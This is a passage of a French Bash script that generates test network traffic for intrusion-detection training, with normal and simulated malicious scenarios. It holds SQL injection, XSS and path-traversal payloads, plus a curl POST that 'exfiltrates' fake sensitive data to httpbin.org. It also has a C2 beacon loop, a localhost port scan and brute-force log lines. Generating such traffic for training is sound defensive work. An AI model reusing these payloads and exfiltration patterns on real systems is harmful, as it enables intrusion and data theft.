        # Connexion FTP simulée
        echo -e "USER anonymous\r\nPASS test@example.com\r\nLIST\r\nQUIT\r\n" | nc -w 3 ftp.dlptest.com 21 > /dev/null 2>&1 &
        log_info "Simulation connexion FTP"
        sleep 3
    fi
}

# ====================================================================
# Fonctions de génération de trafic malveillant (TESTS UNIQUEMENT)
# ====================================================================

generate_port_scan_simulation() {
    log_warning "🚨 SIMULATION de scan de ports (ENVIRONNEMENT DE TEST UNIQUEMENT)"
    
    local target="127.0.0.1"  # Localhost uniquement pour sécurité
    local ports=(22 23 25 53 80 110 135 139 143 443 993 995 1433 3306 3389 5432 8080)
    
    for port in "${ports[@]}"; do
        if command -v nc &> /dev/null; then
            nc -z -w1 "$target" "$port" 2>/dev/null
            log_info "Port scan simulation: $target:$port"
        elif command -v telnet &> /dev/null; then
            timeout 1 telnet "$target" "$port" 2>/dev/null >/dev/null
        fi
        sleep 0.1
    done
}

generate_malicious_http_requests() {
    log_warning "🚨 SIMULATION de requêtes HTTP malveillantes (TESTS UNIQUEMENT)"
    
    # ATTENTION: Ces requêtes sont à des fins de TEST uniquement
    # Utiliser uniquement sur httpbin.org qui est conçu pour les tests
    
    local payloads=(
        "?id=1' OR '1'='1"
        "?search=<script>alert('test')</script>"
        "?file=../../../etc/passwd"
        "?cmd=dir"
        "?union=1 UNION SELECT version()"
    )
    
    for payload in "${payloads[@]}"; do
        if command -v curl &> /dev/null; then
            curl -s -A "TestScanner/1.0" "http://httpbin.org/get${payload}" > /dev/null 2>&1
            log_info "Malicious HTTP simulation: $payload"
        fi
        sleep 2
    done
}

generate_suspicious_dns_queries() {
    log_warning "🚨 SIMULATION de requêtes DNS suspectes"
    
    # Domaines de test inexistants
    local suspicious_domains=(
        "dGVzdGRhdGEtZXhmaWx0cmF0aW9u.nonexistent.local"
        "bWFsd2FyZWNvbW11bmljYXRpb24.fake-c2.test"
        "very-long-suspicious-domain-name-that-might-be-dga-generated.test"
        "rand0mstr1ng123456.malware-test.local"
    )
    
    for domain in "${suspicious_domains[@]}"; do
        if command -v nslookup &> /dev/null; then
            nslookup "$domain" > /dev/null 2>&1
            log_info "Suspicious DNS query: $domain"
        fi
        sleep 1
    done
}

generate_data_exfiltration_simulation() {
    log_warning "🚨 SIMULATION d'exfiltration de données"
    
    # Génération de données factices à "exfiltrer"
    local temp_file="/tmp/fake_sensitive_data.txt"
    
    # Création fichier de test
    cat > "$temp_file" << 'EOF'
FAKE SENSITIVE DATA FOR TESTING
================================
This is simulated sensitive data for network analysis training.
Credit Card: 4111-1111-1111-1111 (TEST)
SSN: 123-45-6789 (FAKE)
Password: P@ssw0rd123 (TEST)
================================
EOF
    
    # "Exfiltration" via HTTP POST
    if command -v curl &> /dev/null; then
        curl -s -X POST -d "@$temp_file" "http://httpbin.org/post" > /dev/null 2>&1
        log_info "Data exfiltration simulation via HTTP POST"
    fi
    
    # Nettoyage
    rm -f "$temp_file"
    sleep 3
}

generate_c2_communication_simulation() {
    log_warning "🚨 SIMULATION de communication C2 (Command & Control)"
    
    # Simulation de beacon périodique
    for i in {1..5}; do
        if command -v curl &> /dev/null; then
            # User-Agent suspect
            curl -s -A "Custom-Malware-Agent/1.0" \
                 -H "X-Session-ID: $(date +%s)" \
                 "http://httpbin.org/get?beacon=$i" > /dev/null 2>&1
            log_info "C2 beacon simulation #$i"
        fi
        sleep 60  # Beacon toutes les minutes
    done &  # En arrière-plan
}

generate_brute_force_simulation() {
    log_warning "🚨 SIMULATION d'attaque brute force SSH"
    
    local target="127.0.0.1"  # Localhost uniquement
    local usernames=("admin" "root" "user" "test" "guest")
    local passwords=("password" "123456" "admin" "test" "guest")
    
    for user in "${usernames[@]}"; do
        for pass in "${passwords[@]}"; do
            # Simulation uniquement (pas de vraie tentative)
            log_info "Brute force simulation: $user:$pass on $target"
            sleep 0.5
        done
    done
}

# ====================================================================
# Génération de trafic mixte réaliste
# ====================================================================

generate_mixed_realistic_traffic() {
    log_info "Génération de trafic mixte réaliste..."
    
    # Lancement en parallèle de différents types de trafic
    generate_http_traffic &
    HTTP_PID=$!
    
    sleep 10
    generate_dns_traffic &
    DNS_PID=$!
    
    sleep 20
    generate_icmp_traffic &
    ICMP_PID=$!
    
    sleep 30
    generate_https_traffic &
    HTTPS_PID=$!
    
    # Injection occasionnelle d'activité suspecte
    sleep 60
    generate_port_scan_simulation &
    SCAN_PID=$!
    
    sleep 90
    generate_malicious_http_requests &
    MALICIOUS_PID=$!
    
    # Attendre la fin de tous les processus
    wait $HTTP_PID $DNS_PID $ICMP_PID $HTTPS_PID $SCAN_PID $MALICIOUS_PID
    
    log_success "Génération de trafic mixte terminée"
}

# ====================================================================
# Scénarios de génération
# ====================================================================

scenario_normal() {
    log_info "🌐 Scénario: Trafic Normal d'Entreprise"
    
    echo "Ce scénario génère du trafic typique d'un environnement d'entreprise:"
    echo "- Navigation web (HTTP/HTTPS)"
    echo "- Résolution DNS"
    echo "- Tests de connectivité (ICMP)"
    echo "- Communications sécurisées"
    echo ""
    
    # Démarrage de la capture en parallèle si demandé
    if [[ "${AUTO_CAPTURE:-}" == "true" ]]; then
        start_packet_capture "normal_traffic"
    fi
    
    generate_http_traffic
    sleep 10
    generate_https_traffic
    sleep 10
    generate_dns_traffic
    sleep 5
    generate_icmp_traffic
    generate_ftp_simulation
    
    log_success "Scénario trafic normal terminé"
}

scenario_malicious() {
    log_warning "🚨 Scénario: Activités Malveillantes (TESTS UNIQUEMENT)"
    
    echo "⚠️  ATTENTION: Ce scénario est destiné UNIQUEMENT aux environnements de test!"
    echo "Il génère du trafic suspect pour l'entraînement à la détection d'intrusion:"
    echo "- Scans de ports"
    echo "- Tentatives d'injection SQL/XSS"
    echo "- Requêtes DNS suspectes"
    echo "- Simulation d'exfiltration"
    echo ""
    
    read -p "Confirmer l'exécution en environnement de TEST (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        log_info "Scénario annulé par l'utilisateur"
        return 0
    fi
    
    if [[ "${AUTO_CAPTURE:-}" == "true" ]]; then
        start_packet_capture "malicious_traffic"
    fi
    
    generate_port_scan_simulation
    sleep 5
    generate_malicious_http_requests
    sleep 10
    generate_suspicious_dns_queries
    sleep 5
    generate_data_exfiltration_simulation
    sleep 10
    generate_brute_force_simulation
    
    # Communication C2 en arrière-plan
    generate_c2_communication_simulation
    
    log_success "Scénario activités malveillantes terminé"
}

scenario_mixed() {
    log_info "🔄 Scénario: Trafic Mixte (Normal + Incidents)"
    
    echo "Ce scénario combine trafic normal et activités suspectes"
    echo "pour simuler un environnement réel avec incidents:"
    echo "- 80% trafic normal"
    echo "- 20% activités suspectes"
    echo ""
    
    if [[ "${AUTO_CAPTURE:-}" == "true" ]]; then
        start_packet_capture "mixed_traffic"
    fi
    
    generate_mixed_realistic_traffic
    
    log_success "Scénario trafic mixte terminé"
}

scenario_all() {
    log_info "🎯 Scénario: Tous les Types de Trafic"
    
    echo "Exécution séquentielle de tous les scénarios"
    echo "Durée estimée: 15-20 minutes"
    echo ""
    
    scenario_normal
    sleep 30
    scenario_malicious
    sleep 30
    scenario_mixed
    
    log_success "Tous les scénarios terminés"
}

# ====================================================================
# Fonctions utilitaires
# ====================================================================

start_packet_capture() {
    local scenario_name="$1"
    local interface="${CAPTURE_INTERFACE:-eth0}"
    local capture_file="$SCRIPT_DIR/../captures/generated_${scenario_name}_$(date +%Y%m%d_%H%M%S).pcap"
    
    log_info "Démarrage de la capture: $capture_file"
    
    if command -v tcpdump &> /dev/null; then
        sudo tcpdump -i "$interface" -w "$capture_file" &
        CAPTURE_PID=$!
        echo "$CAPTURE_PID" > "/tmp/traffic_capture.pid"
        log_success "Capture démarrée (PID: $CAPTURE_PID)"
    else
        log_warning "tcpdump non disponible - capture manuelle recommandée"
    fi
}

stop_packet_capture() {
    if [[ -f "/tmp/traffic_capture.pid" ]]; then
        local capture_pid
        capture_pid=$(cat "/tmp/traffic_capture.pid")
        
        if kill -0 "$capture_pid" 2>/dev/null; then
            sudo kill "$capture_pid"
            log_success "Capture arrêtée (PID: $capture_pid)"
        fi
        
        rm -f "/tmp/traffic_capture.pid"
    fi
}

check_dependencies() {
    log_info "Vérification des dépendances..."
    
    local missing_tools=()
    
    if ! command -v curl &> /dev/null; then
        missing_tools+=("curl")
    fi
    
    if ! command -v nc &> /dev/null; then
        missing_tools+=("netcat")
    fi
    
    if ! command -v nslookup &> /dev/null && ! command -v dig &> /dev/null; then
        missing_tools+=("dns-utils")
    fi
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_warning "Outils manquants: ${missing_tools[*]}"
        log_info "Installation suggérée: sudo apt install curl netcat-openbsd dnsutils"
    else
        log_success "Toutes les dépendances sont disponibles"
    fi
}

show_usage() {
    cat << 'EOF'
🎯 Générateur de Trafic Réseau - Guide d'Utilisation

USAGE:
    ./generate_test_traffic.sh [SCENARIO] [OPTIONS]

SCÉNARIOS:
    normal      Trafic normal d'entreprise (HTTP, HTTPS, DNS, ICMP)
    malicious   Activités malveillantes simulées (TESTS UNIQUEMENT)
    mixed       Combinaison trafic normal + incidents
    all         Tous les scénarios séquentiellement

OPTIONS:
    --capture          Démarrer automatiquement la capture
    --interface IFACE  Interface de capture (défaut: eth0)
    --help            Afficher cette aide

EXEMPLES:
    # Trafic normal avec capture automatique
    ./generate_test_traffic.sh normal --capture

    # Activités malveillantes (tests uniquement)
    ./generate_test_traffic.sh malicious

    # Trafic mixte sur interface wlan0
    ./generate_test_traffic.sh mixed --interface wlan0

SÉCURITÉ:
    ⚠️  Les scénarios 'malicious' et 'mixed' sont destinés UNIQUEMENT
        aux environnements de test et de formation.
    ⚠️  N'exécutez JAMAIS ces scripts sur des réseaux de production
        sans autorisation explicite.

CAPTURE MANUELLE:
    Si vous préférez contrôler la capture manuellement:
    
    # Démarrer la capture
    sudo tcpdump -i eth0 -w capture.pcap
    
    # Dans un autre terminal
    ./generate_test_traffic.sh [scenario]
    
    # Arrêter la capture avec Ctrl+C

ANALYSE:
    Une fois la capture terminée, analysez avec:
    wireshark capture.pcap
    ou
    python3 ../scripts/advanced_analyzer.py capture.pcap

EOF
}

# ====================================================================
# Fonction principale
# ====================================================================

main() {
    echo "======================================================================"
    echo "🎯 Générateur de Trafic Réseau pour Formation Cybersécurité"
    echo "======================================================================"
    echo ""
    
    # Création du fichier de log
    mkdir -p "$(dirname "$LOG_FILE")"
    touch "$LOG_FILE"
    
    log_info "Début de génération de trafic - $(date)"
    
    # Vérification des dépendances
    check_dependencies
    
    # Parsing des arguments
    SCENARIO="${1:-}"
    shift || true
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            --capture)
                AUTO_CAPTURE="true"
                shift
                ;;
            --interface)
                CAPTURE_INTERFACE="$2"
                shift 2
                ;;
            --help)
                show_usage
                exit 0
                ;;
            *)
                log_error "Option inconnue: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Validation du scénario
    case $SCENARIO in
        normal)
            scenario_normal
            ;;
        malicious)
            scenario_malicious
            ;;
        mixed)
            scenario_mixed
            ;;
        all)
            scenario_all
            ;;
        "")
            log_error "Scénario requis"
            show_usage
            exit 1
            ;;
        *)
            log_error "Scénario inconnu: $SCENARIO"
            show_usage
            exit 1
            ;;
    esac
    
    # Arrêt de la capture si démarrée automatiquement
    if [[ "${AUTO_CAPTURE:-}" == "true" ]]; then
        sleep 5  # Attendre la fin du trafic
        stop_packet_capture
    fi
    
    echo ""
    log_success "Génération de trafic terminée!"
    echo ""
    echo "📁 Logs: $LOG_FILE"
    
    if [[ "${AUTO_CAPTURE:-}" == "true" ]]; then
        echo "📁 Captures: $SCRIPT_DIR/../captures/"
        echo ""
        echo "🔍 Prochaines étapes:"
        echo "1. Analyser les captures avec Wireshark"
        echo "2. Utiliser les scripts d'analyse automatique"
        echo "3. Documenter les observations"
    else
        echo ""
        echo "💡 Pour capturer le trafic automatiquement:"
        echo "   $0 $SCENARIO --capture"
    fi
}

# ====================================================================
# Gestion des signaux et nettoyage
# ====================================================================

cleanup() {
    log_info "Arrêt demandé - nettoyage en cours..."
    
    # Arrêter la capture si active
    stop_packet_capture
    
    # Tuer les processus en arrière-plan
    jobs -p | xargs -r kill 2>/dev/null || true
    
    log_info "Nettoyage terminé"
    exit 130
}

trap cleanup SIGINT SIGTERM

# ====================================================================
# Point d'entrée
# ====================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi